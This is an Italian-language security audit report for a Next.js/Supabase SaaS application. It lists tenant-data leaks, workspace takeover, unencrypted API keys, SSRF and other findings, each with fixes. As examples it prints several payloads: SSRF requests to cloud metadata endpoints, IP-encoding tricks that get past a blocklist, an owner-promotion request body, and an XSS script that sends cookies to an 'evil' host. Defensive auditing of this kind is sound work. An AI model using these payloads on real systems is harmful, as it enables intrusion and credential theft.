# Rapporto di Sicurezza e Criticità — AIO Pulse Advance

**Data:** 2026-05-18
**Branch analizzato:** `fase-0/T02-T06-residual-cleanup`
**Perimetro:** intero progetto (333 file TS/TSX, ~100 route API) — Next.js 16 App Router, Supabase Auth, Prisma, Stripe, provider AI multipli.
**Metodo:** revisione statica del codice + 4 audit paralleli specializzati (auth/authz, injection/SSRF, segreti/crypto/dipendenze, isolamento dati/qualità). I 3 finding "headline" sono stati verificati personalmente leggendo il codice sorgente.

---

## ⚠️ Verdetto esecutivo

**Lo stato attuale NON è idoneo al deploy in produzione.** Esistono almeno **4 vulnerabilità critiche sfruttabili oggi da un utente anonimo su Internet**, senza alcuna autenticazione:

1. Lettura cross-tenant in massa dei dati cliente (più endpoint).
2. Takeover di workspace/organizzazione (chiunque si auto-promuove `owner`).
3. Le API key dei provider AI dei clienti **non sono cifrate** (la cifratura documentata non esiste nel codice).
4. SSRF non autenticato che raggiunge gli endpoint di metadata cloud (furto credenziali infrastruttura).

La causa di fondo è architetturale: il middleware **non** applica autenticazione alle route `/api/*` (solo rate-limit + CSP) e **non esiste Row-Level Security** sul database — l'isolamento multi-tenant dipende interamente dal fatto che ogni handler ricordi di filtrare per utente. Decine di route nuove (Fase 1, file `A` in `git status`) hanno saltato questo controllo. Non c'è difesa in profondità.

| Severità | Conteggio |
|---|---|
| 🔴 Critica | 4 |
| 🟠 Alta | 11 |
| 🟡 Media | 12 |
| 🔵 Bassa | 7 |

---

## 🔴 CRITICHE (sfruttabili da anonimo, da correggere prima di qualsiasi deploy)

### C-1 — Esposizione dati cross-tenant senza autenticazione (leak di massa) ✅ *verificato*
**File:** `src/app/api/health-scores/route.ts:15-44`, `src/app/api/gsc/route.ts:6-51`, `src/app/api/scraper/route.ts:6-45`, `src/app/api/keywords/route.ts:6-45`

Nessuna di queste GET chiama `getCurrentUserId`. Usano il client **service-role** (che bypassa la RLS) e filtrano solo per un `brand_id` fornito dall'attaccante — **opzionale**. Senza `brand_id` restituiscono le ultime righe **di tutti i tenant**:

```
GET /api/health-scores          → metriche AVI/visibilità/sentiment di tutti i clienti
GET /api/gsc?brand_id=<vittima> → click/impression Google Search Console di un tenant
GET /api/keywords               → keyword research di tutti i tenant
```

**Impatto:** chiunque, senza login, legge dati di business di qualsiasi cliente. IDOR + dump non autenticato.
**Fix:** in testa a ogni handler: `getCurrentUserId()` → risolvere i brand accessibili con `getAccessibleBrandIds()` → richiedere `brand_id` e validarlo con `verifyBrandAccess(brandId, userId)`. Mai restituire result set non filtrati. Usare `/api/snapshots` come implementazione di riferimento corretta.

### C-2 — Takeover di Workspace/Organizzazione: RBAC bypass + IDOR ✅ *verificato*
**File:** `src/app/api/workspaces/[id]/members/route.ts:16-158` (GET/POST/PATCH/DELETE), `src/app/api/workspaces/route.ts:8-89`, `src/app/api/organizations/current/route.ts:6-54`

Nessun handler autentica il chiamante. La POST prende `userId`, `role`, `inviterId` **dal body** e chiama `addWorkspaceMember` senza alcun controllo di permesso (`canManageMembers` esiste in `src/lib/services/workspace-auth.ts:174` ma non viene mai invocato). `GET /api/workspaces?userId=<vittima>` e `GET /api/organizations/current?userId=<vittima>` prendono l'identità **dalla query string**.

```
POST /api/workspaces/<qualsiasi-id>/members
{ "userId": "<id-attaccante>", "role": "owner" }      → attaccante diventa owner
GET  /api/organizations/current?userId=<vittima>      → enumera org e membri altrui
```

**Impatto:** takeover completo cross-tenant, escalation di privilegi, rimozione dell'owner legittimo, avvelenamento dell'audit-log (`actorId` controllato dall'attaccante).
**Fix:** ricavare l'attore SEMPRE dalla sessione (`getCurrentUserId`), mai da body/query; applicare `checkPermission(userId, workspaceId, 'manage_members')` / `checkOrgPermission` prima di ogni mutazione e di ogni listing; impedire la rimozione/declassamento dell'ultimo owner.

### C-3 — API key dei provider AI memorizzate senza cifratura reale ✅ *verificato*
**File:** `src/app/api/keys/route.ts:6-23,126,141`; `src/app/dashboard/settings/page.tsx:83,118,243`; `.env.example:96-98`

`ENCRYPTION_KEY` è documentata ("Encryption key for user-stored API keys") ma **non è referenziata da nessuna parte in `src/`** — nessun `createCipheriv`/AES-GCM/`crypto.subtle`. La colonna `user_api_keys.encrypted_key` contiene:
- un **hash SHA-256 irreversibile** (`hashApiKey`, riga 21-23) — la chiave così non è nemmeno utilizzabile per chiamare il provider; oppure
- la **chiave in chiaro** (l'euristica `isPlaintextKey` spesso fallisce).

Inoltre `src/app/dashboard/settings/page.tsx:83` fa `select('*')` via client anon e la riga 243 mostra il segreto in UI con un toggle "occhio" → il segreto viaggia fino al browser.
**Impatto:** qualsiasi lettura del DB (SQL injection, backup trafugato, service-key compromessa, RLS mal configurata, insider) espone in chiaro le chiavi OpenAI/Anthropic/Gemini/Perplexity di tutti i clienti → abuso finanziario diretto sugli account dei clienti.
**Fix:** cifratura autenticata reale — `aes-256-gcm` con IV random 12 byte per record, salvare `iv||authTag||ciphertext`, chiave da `ENCRYPTION_KEY` (validare lunghezza 32 byte), decifrare solo lato server. Migrare le righe esistenti. Mai restituire il materiale della chiave al client (esporre solo provider/label/last-4). Eliminare il path SHA-256.

### C-4 — SSRF non autenticato verso metadata cloud / rete interna
**File:** `src/app/api/audit/route.ts:9-16`, `src/app/api/audit/{freshness,llms-txt,fix-brief}/route.ts`, `src/app/api/analyze/route.ts:69-141`, `src/app/api/ai-agent/route.ts:51-99`, `src/app/api/serp/schema-validate/route.ts:16`, `src/app/api/seo/knowledge-graph/route.ts:53`; sink in `src/lib/audit/site-audit.ts:9,63`, `src/lib/audit/generators.ts:49,146`, `src/lib/services/analysis.ts:97`, `src/lib/services/technical-seo-audit.ts:37`

Esiste un `safeFetch` indurito (`src/lib/utils/safe-fetch.ts`) ma i path di audit/scrape principali usano **`fetch()` grezzo** con URL fornito dall'utente, senza auth né validazione IP. `/api/audit` non ha né auth né rate-limit; `/api/ai-agent` risolve l'utente solo per il logging costi e prosegue come `'anonymous'`.

```
POST /api/audit  {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
POST /api/audit  {"url":"http://metadata.google.internal/computeMetadata/v1/"}
```

**Impatto:** furto di credenziali IAM cloud, mappatura/port-scan della rete interna, lettura di servizi interni — il contenuto recuperato torna nel response. Il task `task-28-ssrf-restore` risulta di fatto non implementato sui path a più alto traffico.
**Fix:** instradare **ogni** fetch di URL utente attraverso `safeFetch`; aggiungere auth + rate-limit a `/api/audit*` e `/api/ai-agent`; bloccare range privati/link-local; validare l'URL con zod (`.url()`).

---

## 🟠 ALTE

### H-1 — `safeFetch` aggirabile
**File:** `src/lib/utils/safe-fetch.ts`, `src/lib/domain-analysis.ts:37-66`
Nessuna normalizzazione di IP letterali: `http://2130706433/` (decimale), `0x7f000001`, `0177.0.0.1`, `127.1`, `0.0.0.0` non sono in blocklist. **DNS rebinding/TOCTOU**: l'host viene risolto per la validazione e ri-risolto indipendentemente al `fetch` (riga 140) — niente IP pinning. Dopo il loop dei redirect c'è un `fetch(currentUrl)` finale **non validato**. `domain-analysis.isSafeUrl` è un secondo guard più debole e duplicato.
**Fix:** parsare/rifiutare IP letterali in ogni base (usare `node:net`/`ipaddr.js`); pinnare l'IP validato sulla connessione; ri-validare host+IP a ogni hop incluso il post-loop; consolidare su un unico `safeFetch`.

### H-2 — Stored XSS nel report HTML
**File:** `src/app/api/reports/html/route.ts:160-163,192-194,220,261,293`
`generateHtmlReport` interpola `brandName`, `brand.domain`, nomi competitor (da tabella `brands`, settabili dall'utente) in HTML grezzo senza escaping. Un competitor chiamato `<script>fetch('//evil/?c='+document.cookie)</script>` viene riflesso in una risposta `text/html` same-origin e renderizzato inline (`GET /api/reports/html?brandId=...&download=0`).
**Impatto:** XSS persistente nella sessione autenticata; con brand condivisi nel team diventa "wormable" nell'organizzazione.
**Fix:** entity-encoding (`& < > " '`) di ogni valore dinamico; oppure forzare `Content-Disposition: attachment` + content-type non-HTML. Estendere la verifica a tutti i generatori HTML/PDF.

### H-3 — Webhook Stripe: confronto non constant-time + nessuna protezione replay
**File:** `src/app/api/billing/webhook/route.ts:9-25,42-45`
HMAC calcolato correttamente ma confrontato con `===` (timing side-channel); il `timestamp` `t=` viene estratto ma **mai validato** → un evento catturato può essere **rigiocato all'infinito** (es. `checkout.session.completed` → accredito ripetuto di crediti). `user_id`/`plan`/`credits` presi da `session.metadata` e considerati fidati. Non si usa `stripe.webhooks.constructEvent`.
**Fix:** usare `stripe.webhooks.constructEvent`, o `crypto.timingSafeEqual` + tolleranza `|now - t| ≤ 300s`.

### H-4 — Race nello scalo crediti → double-spend / query gratis illimitate
**File:** `src/app/api/credits/use/route.ts:86-179`
Check-then-act non atomico sia sul free-tier (conta righe odierne poi decide) sia sul saldo a pagamento (somma `balance`, poi inserisce riga negativa separata). Richieste concorrenti leggono lo stesso saldo e passano entrambe → saldo negativo / spesa oltre l'acquistato. Il rate-limit per-IP (10/min) non previene 10 richieste concorrenti nello stesso secondo.
**Impatto:** perdita di ricavi diretta + amplificazione costi LLM.
**Fix:** check+scalo in **una sola operazione atomica** (`UPDATE ... WHERE balance >= cost RETURNING`, funzione Postgres, o transazione serializable con row lock). Stesso pattern per il contatore free giornaliero (`INSERT ... ON CONFLICT`).

### H-5 — Nessuna Row-Level Security sulle tabelle tenant
**File:** `prisma/migrations/*` (RLS abilitata solo su `audit_logs` in `20260513120000_..._apikeys/migration.sql:304-322`), `src/lib/supabase.ts:47-60`
`brands`, `prompts`, `monitoring_results`, `scans`, `snapshots`, `keyword_*`, `organizations`, `workspaces`, `*_members`, `user_api_keys`, `credits` non hanno isolamento a livello DB. Ogni route usa il client **service-role**. L'isolamento dipende al 100% dal codice applicativo — invariante già rotta (vedi C-1/C-2).
**Fix:** breve termine — helper unico `requireUser()` + scoping brand applicato uniformemente, con test/lint che fallisce ogni `route.ts` che usa `createServerClient` senza auth. Lungo termine — RLS + policy per-tenant e reads via client authenticated.

### H-6 — Audit-log esportabile senza RBAC
**File:** `src/app/api/audit-logs/route.ts:26-45`, `src/app/api/audit-logs/export/route.ts:26-40`
Autenticati e correttamente scoped all'org, ma manca il check del permesso `view_audit_logs` (solo `owner`/`admin` per `ORG_PERMISSION_MATRIX`). Un semplice `member` può esportare fino a 10.000 righe di audit (IP, user-agent, azioni di tutti).
**Fix:** `if (!await checkOrgPermission(userId, org.id, 'view_audit_logs')) return 403` su entrambi.

### H-7 — Bypass del controllo crediti in `/api/monitoring`
**File:** `src/app/api/monitoring/route.ts:143-180`
Il gate crediti è in `try/catch` con commento "Continue anyway" e **nessun guard dev-only** → in produzione qualsiasi errore del check fa proseguire il run LLM multi-engine senza scalare crediti (forzabile inducendo il fallimento della fetch interna).
**Fix:** fail-closed (402/503) in produzione; bypass solo con flag dev esplicito.

### H-8 — Endpoint invito: replay + binding identità errato
**File:** `src/app/api/invitations/accept/route.ts:12-14,57-104`
`acceptSchema` è solo `z.string()` (nessun formato/lunghezza). La membership viene inserita con `email: invitation.email` ma `user_id: <chiamante autenticato>` **senza verificare che l'email del chiamante coincida** con quella dell'invito; `invitation.status` non è ri-controllato → token rigiocabile fino a scadenza. Il token è inoltre restituito nel body della POST `/api/team` (`route.ts:190,249`).
**Impatto:** chi ottiene/indovina un token valido lega il proprio account a un brand non suo (escalation privilegi).
**Fix:** `z.string().regex(/^[a-f0-9]{64}$/)`; verificare email autenticata == `invitation.email`; transazione che invalida il token (`UPDATE ... WHERE status='pending'`) prima dell'insert; non restituire il token in risposta.

### H-9 — Token cron confrontato in modo non constant-time
**File:** `src/app/api/cron/{monitoring,weekly-review,keyword-refresh,gsc-sync,digest,brightdata-sync,aeo-bridge}/route.ts`
`if (authHeader !== \`Bearer ${cronSecret}\`)` — timing side-channel sul segreto privilegiato (il segreto *è* obbligatorio: bene, fail-closed se assente).
**Fix:** `crypto.timingSafeEqual` su buffer di lunghezza fissa (hash di entrambi i lati).

### H-10 — Endpoint LLM costosi senza rate-limit (cost-runaway)
**File:** `src/app/api/ai-agent/route.ts:25-185` (anonimo + LLM + crawl, nessun throttle), `src/app/api/recommendations/route.ts:54-181` (auth ok ma nessun `checkRateLimit` prima di `callGemini`), `src/app/api/journey/analyze/route.ts:20-58` (no auth, `turns[]` illimitato, `runtime='edge'`)
**Impatto:** un client può martellare gli endpoint più costosi dell'app — fuga di costi LLM, abuso invisibile (`ai_cost_logs` saltato per anonymous).
**Fix:** auth obbligatoria + `checkRateLimit` keyed su `userId`; cap su `turns.length` e numero URL audit.

### H-11 — Dipendenze runtime vulnerabili (`npm audit`: 0 critical, 4 high)
- **`next` ^16.1.6** — *High, diretta, runtime*. Tra gli advisory: **GHSA-ffhc-5mcf-pf4q "XSS in App Router con nonce CSP"** (questa app usa nonce CSP per-request in `src/middleware.ts` → direttamente rilevante), bypass middleware/proxy (GHSA-26hh-7cqf-hhc6, GHSA-492v-c6pp-mqqv, GHSA-267c-6grr-h53f), cache poisoning, DoS image-optimization.
- **`tar` <=7.5.10** — *High, transitiva via CLI `supabase`*. Path traversal / symlink write.
- **`fast-uri` <=3.1.1** — *High, transitiva*. Path traversal / host confusion.
- **`supabase` ^1.226.0** — è la CLI: dovrebbe stare in `devDependencies`.
**Fix:** `npm audit fix`; aggiornare `next` all'ultima patch 16.x; spostare `supabase` in devDependencies; forzare `tar`/`fast-uri` a versioni patchate.

---

## 🟡 MEDIE

- **M-1 — Messaggi d'errore DB grezzi restituiti al client.** Pattern diffuso: `return err(error.message)` / `err(fetchError.message)` in `snapshots`, `recommendations`, `scans`, `competitor`, `monitoring`, `team`, `serp/tracker`. Espone nomi colonne/constraint/relazioni. *Fix:* messaggio generico + codice stabile, log dettagli server-side.
- **M-2 — `getClientIp` spoofabile** (`src/lib/ratelimit.ts:164-171`): si fida del primo `x-forwarded-for`/`x-real-ip` senza proxy fidato → rate-limit aggirabile ruotando l'header. *Fix:* su Vercel usare l'IP di piattaforma (hop più a destra); per route autenticate keyare su `userId`.
- **M-3 — Nessun cap sulla dimensione delle risposte recuperate** (`site-audit.ts`, `generators.ts`, `analysis.ts`, `technical-seo-audit.ts`): `await response.text()` su stream multi-GB → esaurimento memoria. *Fix:* cap byte (5–10 MB) + timeout.
- **M-4 — ReDoS / input illimitato:** `crawlability.ts:65` `new RegExp(\`^${normalizedRule}\`)` da `User-agent` di robots.txt attaccante; `generators.ts:158-162` con `maxUrls` non limitato (`maxUrls || 200` accetta qualunque numero). *Fix:* cap `maxUrls ≤ 500`, escaping di tutti i metacaratteri o parser non-regex.
- **M-5 — Modello di autorizzazione incoerente:** alcune route usano `brand.user_id === userId` invece di `verifyBrandAccess` (`archive/query/[id]`, `analytics/historical`, `serp/tracker`) e **nessuna route dati considera `organization_id`/`workspace_id`** → membri team negati su alcune route, e lo sharing org non è applicato sui dati (gap latente Fase-1). *Fix:* unico `verifyBrandAccess` che valuti anche org/workspace.
- **M-6 — `/api/errors` avvelenabile:** `userId`/`brandId`/`stack` presi dal body non autenticato e scritti in `security_logs` + Sentry. *Fix:* non fidarsi del body, size-limit, marcare come untrusted.
- **M-7 — Segreto webhook hardcoded in non-prod** (`src/lib/services/webhook-delivery.ts:11-19`): `'dev-only-webhook-secret-do-not-use-in-production'` usato per firmare in qualsiasi `NODE_ENV != production` (preview/staging). *Fix:* throw sempre se mancante.
- **M-8 — API key v1 verificate con SHA-256 non salato** sulla stessa colonna `encrypted_key` (`src/app/api/v1/.../route.ts`): bruteforce offline + overloading colonna. *Fix:* tabella `api_keys` dedicata con bcrypt/argon2 o HMAC con pepper.
- **M-9 — Validazione input assente** su `/api/audit*`, `/api/ai-agent`, `serp/schema-validate`, `seo/knowledge-graph` (body/oggetti `providedAudit`/`context` fidati grezzi, nessun limite dimensione). *Fix:* schemi zod URL-validati e length-bounded.
- **M-10 — `.or()` con interpolazione di stringa** (`src/app/api/scans/route.ts:44`): pattern PostgREST injection-prone (oggi non sfruttabile perché UUID fidati). *Fix:* usare `.in()`/`.eq()` builder o validare UUID.
- **M-11 — Hardening CSP/CORS:** `style-src 'unsafe-inline'` e `img-src https:` (`src/middleware.ts:32-43`); CORS statico applicato anche a webhook/cron senza `Vary: Origin` (`vercel.json:37-54`). *Fix:* style-src nonce/hash, img-src ristretto, CORS scoped per route.
- **M-12 — Envelope di risposta incoerente:** la maggior parte usa `{success,message}` (`api-utils`), ma `serp/tracker`/`journey/analyze`/`audit-logs`/`workspaces`/`cost-monitor` usano `{error}`. *Fix:* standardizzare sull'envelope `api-utils`.

---

## 🔵 BASSE

- **L-1 — Fallback `DEV_USER_ID` non gated da `isProductionRuntime`** (`src/lib/supabase.ts:150-156`): il guard CF-01 a livello modulo protegge Vercel-prod, ma il fallback finale è difesa a singolo strato (rischio su self-host/Docker/preview con `DEV_USER_ID` settato). *Fix:* gate esplicito `!isProductionRuntime` anche su questo branch.
- **L-2 — Credenziali demo nel bundle client** con fallback hardcoded `Demo1234!` (`src/app/auth/login/page.tsx:23-25`). *Fix:* nessuna password nota in bundle; verificare che nessun account demo prod la usi.
- **L-3 — Sentry client senza scrubbing PII** (`sentry.client.config.ts:32-37`): il server scrubba, il client no. *Fix:* replicare la redazione server-side.
- **L-4 — Guard auth morti:** `if (!userId)` dopo `getCurrentUserId` (che *lancia*, non ritorna falsy) in `reviews/weekly`, `cost-monitor` → `AuthError` non catturato diventa 500 invece di 401. *Fix:* `try/catch (AuthError)` come nelle altre route.
- **L-5 — `console.error` in ~12 catch di route API** (`ai-agent`, `cost-monitor`, `gsc`, `audit*`, `health-scores`, `keywords`, `scraper`): `compiler.removeConsole` in prod li elimina → path d'errore **silenziosi** (niente Sentry/log). *Fix:* usare `logger.error`.
- **L-6 — Densità `: any` / `as any`: 148 occorrenze in 43 file**, concentrate proprio sul codice DB con i bug di isolamento. *Fix:* tipizzare incrementalmente le risposte Supabase (tipi `Database` già generati).
- **L-7 — Dipendenza `tweetnacl` dichiarata ma mai usata** in `src/`. *Fix:* rimuovere per ridurre la superficie supply-chain.

---

## ✅ Aspetti positivi (già corretti / ben fatti)

- `npx tsc --noEmit` → **0 errori** (il task `task-27-tsc-cleanup` risulta già chiuso); `next.config.ts` **non** ha `ignoreBuildErrors`/`ignoreDuringBuilds`.
- Header di sicurezza forti: HSTS, `X-Frame-Options: DENY`, `nosniff`, `Referrer-Policy`, `Permissions-Policy`, CSP con nonce per-request.
- Token invito/team generati con `crypto.randomBytes(32)` (non `Math.random`).
- Webhook **in uscita**: HMAC-SHA256 corretto; `verifyWebhook` in ingresso (`src/lib/services/public-api.ts:7-13`) usa correttamente `timingSafeEqual` con pre-check di lunghezza.
- `.env`/`.env.local` correttamente git-ignored; nessun segreto reale committato (solo placeholder in `.env.example`).
- Nessuna SQL injection (`$queryRaw*` assente), nessun `child_process`/path-traversal, nessuno zip-slip negli export.
- `/api/snapshots` è un'implementazione di riferimento corretta (`getCurrentUserId` → `verifyBrandAccess`) da replicare ovunque.

---

## 🛠️ Priorità di remediation consigliata

**Sprint 0 — bloccante deploy (giorni):**
1. C-1, C-2: aggiungere `getCurrentUserId` + scoping/RBAC a tutte le route nuove Fase-1 (helper condiviso `requireUser()` + `verifyBrandAccess`). Aggiungere un test/lint gate che fallisce ogni `route.ts` con `createServerClient` senza auth.
2. C-4 + H-1: instradare ogni fetch utente su `safeFetch` indurito (IP letterali, IP pinning, post-loop redirect); auth+rate-limit su `/api/audit*` e `/api/ai-agent`.
3. C-3: cifratura AES-256-GCM reale per `user_api_keys` + migrazione + smettere di inviare segreti al client.

**Sprint 1 — alta priorità (1–2 settimane):**
4. H-3 (Stripe `constructEvent`), H-4 (scalo crediti atomico), H-8 (invito), H-9 (cron timingSafeEqual), H-7 (monitoring fail-closed), H-2 (escaping report HTML).
5. H-11: aggiornare `next` + `npm audit fix` + spostare `supabase` in devDeps.

**Sprint 2 — difesa in profondità (3–4 settimane):**
6. H-5: abilitare RLS sulle tabelle tenant; passare le reads utente a client authenticated.
7. Medie (M-1…M-12) e Basse, standardizzazione envelope/errori, hardening rate-limit.

---

*Report generato da analisi statica multi-agente. I finding C-1/C-2/C-3 sono stati verificati manualmente sul codice sorgente; gli altri provengono da audit specializzati con citazioni file:riga e vanno riconfermati in fase di fix.*
